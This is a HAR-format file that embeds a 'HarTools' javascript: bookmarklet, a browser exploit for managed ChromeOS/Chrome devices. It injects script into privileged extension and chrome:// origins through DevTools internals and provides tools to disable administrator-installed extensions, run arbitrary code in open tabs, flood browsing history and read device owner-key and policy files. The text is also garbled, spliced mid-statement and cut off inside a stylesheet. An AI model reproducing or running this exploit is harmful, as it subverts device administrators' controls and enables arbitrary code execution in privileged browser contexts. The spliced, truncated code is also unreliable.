{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "NodeJS HarGen",
      "version": "1.0"
    },
    "pages": [
      {
        "startedDateTime": "2025-05-09T00:29:25.416Z",
        "id": "page_1",
        "title": "javascript:(function(){eval(atob(\"onerror = alert;

const uiTemplate = `

`;

if (localStorage.getItem("userdefIds") === null)
    localStorage.setItem("userdefIds", JSON.stringify([]));

Array.prototype.remove = function(item) {
    if (this.indexOf(item) === -1) throw new Error("not in array");
    this.splice(this.indexOf(item), 1);
};

function makeToast(msg, time) {
    const popover = document.createElement("article");
    popover.popover = "manual";
    popover.classList.add("toast");
    popover.classList.add("newest");
    popover.textContent = msg;
    popover.style.translate = "-50%";

    document.body.appendChild(popover);
    popover.showPopover();

    setTimeout(() => {
        popover.hidePopover();
        setTimeout(() => {
            popover.remove();
        }, 500);
    }, time * 1000);

    popover.addEventListener("toggle", (event) =/ payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#troll').onclick = function () {
                let removed = atob("// removed at the request of zeglol
console.log(1);
alert("This payload has been removed, it will not be fixed or updated again");==");
                eval(removed);
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()==\"))})()",
        "pageTimings": {
          "onContentLoad": 57.19,
          "onLoad": 57.77
        }
      }
    ],
    "entries": [
      {
        "_connectionId": "16771",
        "_initiator": {
          "type": "script",
          "stack": {
            "callFrames": [
              {
                "functionName": "",
                "scriptId": "9",
                "url": "",
                "lineNumber": 11,
                "columnNumber": 4
              }
            ]
          }
        },
        "_priority": "High",
        "_resourceType": "fetch",
        "cache": {},
        "connection": "443",
        "pageref": "page_1",
        "request": {
          "method": "GET",
          "url": "javascript:(function(){eval(atob(\"((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`onerror = alert;

const uiTemplate = `

`;

if (localStorage.getItem("userdefIds") === null)
    localStorage.setItem("userdefIds", JSON.stringify([]));

Array.prototype.remove = function(item) {
    if (this.indexOf(item) === -1) throw new Error("not in array");
    this.splice(this.indexOf(item), 1);
};

function makeToast(msg, time) {
    const popover = document.createElement("article");
    popover.popover = "manual";
    popover.classList.add("toast");
    popover.classList.add("newest");
    popover.textContent = msg;
    popover.style.translate = "-50%";

    document.body.appendChild(popover);
    popover.showPopover();

    setTimeout(() => {
        popover.hidePopover();
        setTimeout(() => {
            popover.remove();
        }, 500);
    }, time * 1000);

    popover.addEventListener("toggle", (event) => {
        if (event.newState === "open") {
            moveToasts();
        }
    });
}

function moveToasts() {
    const toasts = document.querySelectorAll(".toast");

    toasts.forEach((toast) => {
        if (toast.classList.contains("newest")) {
            toast.style.top = `5px`;
            toast.classList.remove("newest");
        } else {
            const prevValue = toast.style.top.replace("px", "");
            const newValue = parseInt(prevValue) + toast.clientHeight + 10;
            toast.style.top = `${newValue}px`;
        }
    });
}

function makeDialog(title, msg, oncancel, onconfirm) {
    const dialog = document.createElement("dialog");
    const confirmBtn = document.createElement("button");
    const cancelBtn = document.createElement("button");
    const head = document.createElement("h1");
    const body = document.createElement("div");
    const foot = document.createElement("div");

    dialog.appendChild(head);
    dialog.appendChild(body);
    dialog.appendChild(foot);
    foot.appendChild(confirmBtn);
    foot.appendChild(cancelBtn);
    document.body.appendChild(dialog);

    head.textContent = title;

    body.style.overflowY = "scroll";
    body.style.color = "rgb(220 220 220)";
    body.style.fontSize = "1rem";
    body.style.borderRadius = "10px";
    body.style.padding = "10px";
    body.style.marginBottom = "10px";

    if (Array.isArray(msg)) {
        body.style.border = "solid 1px #1d1d1d";
        msg.forEach((value) => {
            let item = document.createElement("p");
            item.textContent = value;
            body.appendChild(item);
        });
    } else {
        body.style.border = "solid 1px #2d2d2d";
        body.textContent = msg;
    }

    foot.style.height = "fit-content";
    foot.style.marginTop = "auto";
    foot.style.display = "flex";
    foot.style.flexDirection = "row-reverse";

    confirmBtn.classList.add("confirmBtn");
    confirmBtn.addEventListener("click", () => {
        dialog.close();
        onconfirm();
        setTimeout(() => dialog.remove(), 1000);
    });
    confirmBtn.textContent = "Confirm";

    cancelBtn.classList.add("cancelBtn");
    cancelBtn.addEventListener("click", () => {
        dialog.close();
        oncancel();
        setTimeout(() => dialog.remove(), 1000);
    });
    cancelBtn.textContent = "Cancel";

    dialog.showModal();
}

async function extensionExists(id) {
    return new Promise((resolve) =>
        chrome.management.getAll((extensions) =>
            resolve(extensions.some((ext) => ext.id === id))
        )
    );
}

const managementTemplate = `
<title>Untitled document</title>
<link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/docs.ico">
<div id="chrome_management_disable_ext">
  <div class="header">
    <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
    <h1> chrome.management Disable Extensions </h1><br>
    <hr><p> Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Chrome Version: R${navigator.appVersion.match(/Chrom(e|ium)\/([0-9]+)/)[2];} </p></hr>
  </div>
  <p class="description">GitHub repo: https://github.com/crossjbly/HarTools/ <br> XSS found by <a href="https://crossjbly.pages.dev/">crossjbly</a> <br> UI made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a><br></p><hr>
  <whitebuttons>
  <button id="current-extension">Disable injected extension</button>
  <button id="rmv-cmn-blt">Remove Bloat</button>
  <button id="disable-userdef-exts">Disable user defined list of extensions</button>
  </whitebuttons>
	<hr>
  <br /><br />
  <ul class="extlist">
  </ul>

  <div style="height: 50px"></div>
</div>

`;
let savedExtList = [];
const kFiles = [
    "/var/lib/devicesettings/owner.key",
    "/home/chronos/Local State"
]
async function readFile(path) {
    return (await fetch("file://" + path)).arrayBuffer();
}
async function findLastPolicyFile() {
    const kDevicePolicy = "/var/lib/devicesettings/policy.";
    let foundSomething = false;
    let i = 0;
    while (true) {
        try {
            console.log("Trying " + kDevicePolicy + i);
            await readFile(kDevicePolicy + i);
            foundSomething = true;
        } catch {
            if (foundSomething) {
                return kDevicePolicy + (i - 1);
            }
        }
        i++;
    }
}

function doesNeedFileAccess() {
    const sc = chrome.runtime.getManifest().permissions;
    return sc.includes("activeTab") || sc.includes("<all_urls>");
}

function normalizeStringPosix(path, allowAboveRoot) {
    var res = '';
    var lastSegmentLength = 0;
    var lastSlash = -1;
    var dots = 0;
    var code;
    for (var i = 0; i <= path.length; ++i) {
        if (i < path.length)
            code = path.charCodeAt(i);
        else if (code === 47)
            break;
        else
            code = 47;
        if (code === 47) {
            if (lastSlash === i - 1 || dots === 1) {

            } else if (lastSlash !== i - 1 && dots === 2) {
                if (res.length < 2 || lastSegmentLength !== 2 || res.charCodeAt(res.length - 1) !== 46 || res.charCodeAt(res.length - 2) !== 46) {
                    if (res.length > 2) {
                        var lastSlashIndex = res.lastIndexOf('/');
                        if (lastSlashIndex !== res.length - 1) {
                            if (lastSlashIndex === -1) {
                                res = '';
                                lastSegmentLength = 0;
                            } else {
                                res = res.slice(0, lastSlashIndex);
                                lastSegmentLength = res.length - 1 - res.lastIndexOf('/');
                            }
                            lastSlash = i;
                            dots = 0;
                            continue;
                        }
                    } else if (res.length === 2 || res.length === 1) {
                        res = '';
                        lastSegmentLength = 0;
                        lastSlash = i;
                        dots = 0;
                        continue;
                    }
                }
                if (allowAboveRoot) {
                    if (res.length > 0)
                        res += '/..';
                    else
                        res = '..';
                    lastSegmentLength = 2;
                }
            } else {
                if (res.length > 0)
                    res += '/' + path.slice(lastSlash + 1, i);
                else
                    res = path.slice(lastSlash + 1, i);
                lastSegmentLength = i - lastSlash - 1;
            }
            lastSlash = i;
            dots = 0;
        } else if (code === 46 && dots !== -1) {
            ++dots;
        } else {
            dots = -1;
        }
    }
    return res;
}

function _format(sep, pathObject) {
    var dir = pathObject.dir || pathObject.root;
    var base = pathObject.base || (pathObject.name || '') + (pathObject.ext || '');
    if (!dir) {
        return base;
    }
    if (dir === pathObject.root) {
        return dir + base;
    }
    return dir + sep + base;
}
var posix = {

    resolve: function resolve() {
        var resolvedPath = '';
        var resolvedAbsolute = false;
        var cwd;
        for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
            var path;
            if (i >= 0)
                path = arguments[i];
            else {
                if (cwd === undefined)
                    cwd = process.cwd();
                path = cwd;
            }
            assertPath(path);

            if (path.length === 0) {
                continue;
            }
            resolvedPath = path + '/' + resolvedPath;
            resolvedAbsolute = path.charCodeAt(0) === 47;
        }

        resolvedPath = normalizeStringPosix(resolvedPath, !resolvedAbsolute);
        if (resolvedAbsolute) {
            if (resolvedPath.length > 0)
                return '/' + resolvedPath;
            else
                return '/';
        } else if (resolvedPath.length > 0) {
            return resolvedPath;
        } else {
            return '.';
        }
    },
    normalize: function normalize(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var isAbsolute = path.charCodeAt(0) === 47;
        var trailingSeparator = path.charCodeAt(path.length - 1) === 47;

        path = normalizeStringPosix(path, !isAbsolute);
        if (path.length === 0 && !isAbsolute) path = '.';
        if (path.length > 0 && trailingSeparator) path += '/';
        if (isAbsolute) return '/' + path;
        return path;
    },
    isAbsolute: function isAbsolute(path) {
        assertPath(path);
        return path.length > 0 && path.charCodeAt(0) === 47;
    },
    join: function join() {
        if (arguments.length === 0)
            return '.';
        var joined;
        for (var i = 0; i < arguments.length; ++i) {
            var arg = arguments[i];
            assertPath(arg);
            if (arg.length > 0) {
                if (joined === undefined)
                    joined = arg;
                else
                    joined += '/' + arg;
            }
        }
        if (joined === undefined)
            return '.';
        return posix.normalize(joined);
    },
    relative: function relative(from, to) {
        assertPath(from);
        assertPath(to);
        if (from === to) return '';
        from = posix.resolve(from);
        to = posix.resolve(to);
        if (from === to) return '';

        var fromStart = 1;
        for (; fromStart < from.length; ++fromStart) {
            if (from.charCodeAt(fromStart) !== 47)
                break;
        }
        var fromEnd = from.length;
        var fromLen = fromEnd - fromStart;

        var toStart = 1;
        for (; toStart < to.length; ++toStart) {
            if (to.charCodeAt(toStart) !== 47)
                break;
        }
        var toEnd = to.length;
        var toLen = toEnd - toStart;

        var length = fromLen < toLen ? fromLen : toLen;
        var lastCommonSep = -1;
        var i = 0;
        for (; i <= length; ++i) {
            if (i === length) {
                if (toLen > length) {
                    if (to.charCodeAt(toStart + i) === 47) {

                        return to.slice(toStart + i + 1);
                    } else if (i === 0) {

                        return to.slice(toStart + i);
                    }
                } else if (fromLen > length) {
                    if (from.charCodeAt(fromStart + i) === 47) {

                        lastCommonSep = i;
                    } else if (i === 0) {

                        lastCommonSep = 0;
                    }
                }
                break;
            }
            var fromCode = from.charCodeAt(fromStart + i);
            var toCode = to.charCodeAt(toStart + i);
            if (fromCode !== toCode)
                break;
            else if (fromCode === 47)
                lastCommonSep = i;
        }
        var out = '';

        for (i = fromStart + lastCommonSep + 1; i <= fromEnd; ++i) {
            if (i === fromEnd || from.charCodeAt(i) === 47) {
                if (out.length === 0)
                    out += '..';
                else
                    out += '/..';
            }
        }

        if (out.length > 0)
            return out + to.slice(toStart + lastCommonSep);
        else {
            toStart += lastCommonSep;
            if (to.charCodeAt(toStart) === 47)
                ++toStart;
            return to.slice(toStart);
        }
    },
    _makeLong: function _makeLong(path) {
        return path;
    },
    dirname: function dirname(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var code = path.charCodeAt(0);
        var hasRoot = code === 47;
        var end = -1;
        var matchedSlash = true;
        for (var i = path.length - 1; i >= 1; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {
                if (!matchedSlash) {
                    end = i;
                    break;
                }
            } else {

                matchedSlash = false;
            }
        }
        if (end === -1) return hasRoot ? '/' : '.';
        if (hasRoot && end === 1) return '//';
        return path.slice(0, end);
    },
    basename: function basename(path, ext) {
        if (ext !== undefined && typeof ext !== 'string') throw new TypeError('"ext" argument must be a string');

        var start = 0;
        var end = -1;
        var matchedSlash = true;
        var i;
        if (ext !== undefined && ext.length > 0 && ext.length <= path.length) {
            if (ext.length === path.length && ext === path) return '';
            var extIdx = ext.length - 1;
            var firstNonSlashEnd = -1;
            for (i = path.length - 1; i >= 0; --i) {
                var code = path.charCodeAt(i);
                if (code === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else {
                    if (firstNonSlashEnd === -1) {

                        matchedSlash = false;
                        firstNonSlashEnd = i + 1;
                    }
                    if (extIdx >= 0) {

                        if (code === ext.charCodeAt(extIdx)) {
                            if (--extIdx === -1) {

                                end = i;
                            }
                        } else {

                            extIdx = -1;
                            end = firstNonSlashEnd;
                        }
                    }
                }
            }
            if (start === end) end = firstNonSlashEnd;
            else if (end === -1) end = path.length;
            return path.slice(start, end);
        } else {
            for (i = path.length - 1; i >= 0; --i) {
                if (path.charCodeAt(i) === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else if (end === -1) {

                    matchedSlash = false;
                    end = i + 1;
                }
            }
            if (end === -1) return '';
            return path.slice(start, end);
        }
    },
    extname: function extname(path) {
        assertPath(path);
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;

        var preDotState = 0;
        for (var i = path.length - 1; i >= 0; --i) {
            var code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1)
                    startDot = i;
                else if (preDotState !== 1)
                    preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            return '';
        }
        return path.slice(startDot, end);
    },
    format: function format(pathObject) {
        if (pathObject === null || typeof pathObject !== 'object') {
            throw new TypeError('The "pathObject" argument must be of type Object. Received type ' + typeof pathObject);
        }
        return _format('/', pathObject);
    },
    parse: function parse(path) {
        assertPath(path);
        var ret = {
            root: '',
            dir: '',
            base: '',
            ext: '',
            name: ''
        };
        if (path.length === 0) return ret;
        var code = path.charCodeAt(0);
        var isAbsolute = code === 47;
        var start;
        if (isAbsolute) {
            ret.root = '/';
            start = 1;
        } else {
            start = 0;
        }
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;
        var i = path.length - 1;

        var preDotState = 0;

        for (; i >= start; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1) startDot = i;
                else if (preDotState !== 1) preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            if (end !== -1) {
                if (startPart === 0 && isAbsolute) ret.base = ret.name = path.slice(1, end);
                else ret.base = ret.name = path.slice(startPart, end);
            }
        } else {
            if (startPart === 0 && isAbsolute) {
                ret.name = path.slice(1, startDot);
                ret.base = path.slice(1, end);
            } else {
                ret.name = path.slice(startPart, startDot);
                ret.base = path.slice(startPart, end);
            }
            ret.ext = path.slice(startDot, end);
        }
        if (startPart > 0) ret.dir = path.slice(0, startPart - 1);
        else if (isAbsolute) ret.dir = '/';
        return ret;
    },
    sep: '/',
    delimiter: ':',
    win32: null,
    posix: null
};
const slides = [];
let activeSlideIdx = 0;
const handleCallbacks_ = [];
const WAIT_FOR_FINISH = 1;
requestAnimationFrame(function a(t) {
    for (const cb of handleCallbacks_) {
        let m;
        if ((m = cb.f.apply(null, [t - cb.t]))) {
            if (m === 1) {
                return;
            } else {
                handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
            }
        }
    }
    requestAnimationFrame(a);
});
const handleInAnimationFrame = (cb, thiz = null, args = []) => {
    handleCallbacks_.push({
        f: cb,
        t: performance.now(),
    });
};

class DefaultExtensionCapabilities {
    static template = `
  <title>Untitled document</title>
  <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/docs.ico">
  <div id="ext_default">
    <div id="default_extension_capabilities">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1> Default Extension Capabilities </h1>
      </div>
      <div id="tabs-buttons">
        <p>On tab update</p>
        <div id="toggleable-buttons">
		<whitebuttons>
          <button id="eruda">Eruda</button>
          <button id="chii">Chii</button>
          <button id="adblock">Adblock</button>
          <button id="edpuzzle">Edpuzzle hax</button>
          <!-- <button id="glocked">Gforms Locked Mode bypass</button> -->
		</whitebuttons>
        </div>
      </div>
      <div id="other-buttons">
        <p>Other scripts</p>
		<whitebuttons>
        <button id="swamp">Swamp</button>
        <button id="update">Update Hartools</button>
        <button id="quick-rmv-blt">Quick Remove Bloat (used w/ gforms exten)</button>
        <button id="hstfld">History Flood</button>
		</whitebuttons>
      </div>
      <h2>Evaluate code</h1>
        <div class="container">
          <textarea id="code" placeholder="Enter JavaScript to inject"></textarea>
        </div>
        <button id="code-run">Run</button>
        <div id="code-output"></div>

    </div>
    <div id="extension_tabs_default">
      <button id="tabreload">Refresh Tabs</button>
      <ul>
      </ul>
      <input id="TabURLInput"/> <button id="TabURLSubmit">Create</button>
    </div>
  </div>
  `;
    updateTabList() {
        if (this.disarmed) {
            return;
        }

        if (this.tabListInProgress) {

            return;
        }
        this.tabListInProgress = true;

        const tablist = document.body.querySelector("#extension_tabs_default ul");

        tablist.innerHTML = "";
        const thiz = this;
        chrome.windows.getAll(function(win) {
            win.forEach(function(v) {
                chrome.tabs.query({
                    windowId: v.id
                }, function(tabInfos) {
                    tabInfos.forEach(function(info) {
                        const div = document.createElement("div");
                        div.className = "tablist-item";
                        div.innerHTML = `<img ${
              chrome.tabs && (info.favIconUrl?.length ?? 0) > 0
                ? `src="${info.favIconUrl}"`
                : ""
            }/><span class="tab-name">${info.title} <litstuff> ${info.url}<litstuff></span>`;
                        if (chrome.scripting || chrome.tabs.executeScript) {
                            const runButton = document.createElement("button");
                            runButton.textContent = "Run";
                            runButton.onclick = () => runCode(true, info.id);
                            div.appendChild(runButton);
                        }

                        const previewButton = document.createElement("button");
                        previewButton.textContent = "Preview";

                        previewButton.onclick = () => {
                            thiz.disarm = true;

                            thiz.previewing = true;

                            chrome.windows.update(
                                info.windowId, {
                                    focused: true,
                                },
                                function() {
                                    chrome.tabs.update(info.id, {
                                        active: true
                                    });
                                }
                            );
                            window.currentTimeout = setTimeout(function m() {
                                clearTimeout(window.currentTimeout);

                                chrome.tabs.getCurrent(function(tab) {
                                    chrome.windows.update(
                                        tab.windowId, {
                                            focused: true,
                                        },
                                        function() {
                                            chrome.tabs.update(tab.id, {
                                                active: true
                                            });
                                            thiz.disarm = false;
                                            thiz.previewing = false;
                                        }
                                    );
                                });
                            }, 100);
                        };

                        div.appendChild(previewButton);
                        tablist.appendChild(div);
                    });
                    thiz.tabListInProgress = false;
                });
            });
        });
    }
    activate() {
        document.body.insertAdjacentHTML(
            "beforeend",
            DefaultExtensionCapabilities.template
        );

        document.body
            .querySelector("#ext_default")
            .querySelectorAll("button")
            .forEach(function(btn) {

                btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
            }, this);

        this.updateTabList();
        for (let i in chrome.tabs) {
            if (i.startsWith("on")) {
                chrome.tabs[i].addListener(() => {
                    this.updateTabList();
                });
            }
        }

    }
    static getFS() {
        return new Promise(function(resolve) {
            webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
        });
    }
    static async writeFile(file, data) {
        const fs = await DefaultExtensionCapabilities.getFS();
        return new Promise((resolve, reject) => {
            fs.root.getFile(file, {
                create: true
            }, function(entry) {
                entry.remove(function() {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.createWriter(function(writer) {
                            writer.write(new Blob([data]));
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                        });
                    });
                });
            });
        });
    }
    static async evalCode(code) {
        const url = await DefaultExtensionCapabilities.writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);
    }

    async onBtnClick_(b) {
        switch (b.id) {
            case "code_evaluate": {
                console.log("Evaluating code!");
                const x = document.querySelector("#code_input").value;
                const fs = await DefaultExtensionCapabilities.getFS();
                DefaultExtensionCapabilities.evalCode(x);
            }
            case "tabreload": {
                this.updateTabList();
            }
        }
    }
}
class HostPermissions {
    activate() {}
}

function createExtensionCard(name, id, enabled, icon_url) {
  const li = document.createElement("li");
  li.className = "extension-card";

  const headerDiv = document.createElement("div");
  headerDiv.className = "extension-header";

  const icon = document.createElement("img");
  icon.className = "extension-icon";
  icon.src = icon_url;
  icon.alt = "Extension Icon";

  const nameDiv = document.createElement("div");
  nameDiv.className = "extension-name";
  nameDiv.textContent = name;

  headerDiv.appendChild(icon);
  headerDiv.appendChild(nameDiv);

  const idDiv = document.createElement("div");
  idDiv.className = "extension-id";
  idDiv.textContent = id;

  const switchLabel = document.createElement("label");
  switchLabel.className = "switch";

  const checkbox = document.createElement("input");
  checkbox.type = "checkbox";
  if (enabled) checkbox.checked = true;

  const sliderSpan = document.createElement("span");
  sliderSpan.className = "slider";

  switchLabel.appendChild(checkbox);
  switchLabel.appendChild(sliderSpan);

  li.appendChild(headerDiv);
  li.appendChild(idDiv);
  li.appendChild(switchLabel);

  return li;
}

function createExtensionCardAll(enabled = true) {
  const li = document.createElement("li");
  li.className = "extension-card-all";
  li.innerHTML = `
    <div class="extension-header">
      <img class="extension-icon" src="https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif" />
      <div class="extension-name">All Extensions</div>
    </div>
    <label class="switch">
      <input type="checkbox" ${enabled ? "checked" : ""}>
      <span class="slider"></span>
    </label>
  `;
  return li;
}

function updateExtensionStatus(extlist_element) {
    return new Promise(function(resolve, reject) {
        extlist_element.innerHTML = "";
        let cardAll = createExtensionCardAll();
        let cardInputAll = cardAll.querySelector("input");

        cardInputAll.addEventListener("change", (event) => {
            cardInputAll.disabled = true;
            chrome.management.getSelf(function(self) {
                chrome.management.getAll(function(extensions) {
                    if (chrome.runtime.lastError) {
                        alert(
                            "Error loading extensions: " + chrome.runtime.lastError.message
                        );
                        return reject(chrome.runtime.lastError);
                    }

                    const promises = [];
                    for (let i = 0; i < extensions.length; i++) {
                        let extId = extensions[i].id;
                        if (extId !== self.id) {
                            promises.push(
                                chrome.management.setEnabled(extId, event.target.checked)
                            );
                        }
                    }
                    Promise.all(promises)
                        .then(() => {
                            cardInputAll.disabled = false;
                            resolve();
                        })
                        .catch((error) => {
                            alert("Error enabling/disabling extensions: " + error.message);
                            reject(error);
                        });
                });
            });
        });

        extlist_element.appendChild(cardAll);

        chrome.management.getAll(function(extlist) {
            if (chrome.runtime.lastError) {
                alert("Error loading extensions: " + chrome.runtime.lastError.message);
                return reject(chrome.runtime.lastError);
            }

            const ordlist = [];
            extlist.forEach(function(extension) {
                if (extension.id === new URL(new URL(location.href).origin).host) {
                    return;
                }
                ordlist.push(extension);

                const icon =
                    extension.icons?.find((ic) => ic.size === 128) ??
                    extension.icons?.at(-1);

                let card = createExtensionCard(
                    extension.name,
                    extension.id,
                    extension.enabled,
                    icon?.url ||
                    "https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif"
                );

                let cardInput = card.querySelector("input");

                cardInput.addEventListener("change", (event) => {
                    chrome.management.setEnabled(
                        extension.id,
                        event.target.checked,
                        (result) => {
                            if (chrome.runtime.lastError) {
                                alert(
                                    "Error updating extension status: " +
                                    chrome.runtime.lastError.message
                                );
                            }
                        }
                    );
                });

                card.querySelector(".extension-icon").addEventListener("click", () => {
                    userdefIds = JSON.parse(localStorage.getItem("userdefIds"));
                    if (userdefIds.includes(extension.id)) {
                        userdefIds.remove(extension.id);
                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("removed " + extension.shortName + " from the list", 2);
                    } else {
                        userdefIds.push(extension.id);
                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("added " + extension.shortName + " to the list", 2);
                    }

                    if (localStorage.getItem("userdefIds") === JSON.stringify([])) {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: none;");
                    } else {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: inline;");
                    }
                });

                extlist_element.appendChild(card);
            });
            savedExtList = ordlist;
            resolve();
        });
    });
}

const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>

`;
const htmlStyle = `
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap');

* {
  font-family: 'Roboto', Arial, sans-serif;
}

body {
  background-color: #1e1f22;
  color: #fff;
  margin: 0;
  padding: 20px;
}

body::-webkit-scrollbar,
dialog::-webkit-scrollbar,
dialog div::-webkit-scrollbar {
  display: none;
}

p {
  margin: 5px auto;
  color: white;
}

#chrome_management_disable_ext, #ext_default {
  max-width: 1200px;
  margin: 0 auto;
}

h1 {
  font-size: 24px;
  margin-bottom: 20px;
}

.description {
  margin-bottom: 20px;
}

ul {
  list-style-type: none;
  padding: 0;
  margin: 0;
  padding-bottom: 50px;
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
}

.extension-card, .extension-card-all {
  margin-left: 5px;
  margin-bottom: 6px;
  background: #292a2d;
  border-radius: 10px;
  width: 375px;
  height: 140px;
  padding: 10px;
  display: flex;
  flex-direction: column;
  gap: 10px;
  padding: 10px;
  position: relative;
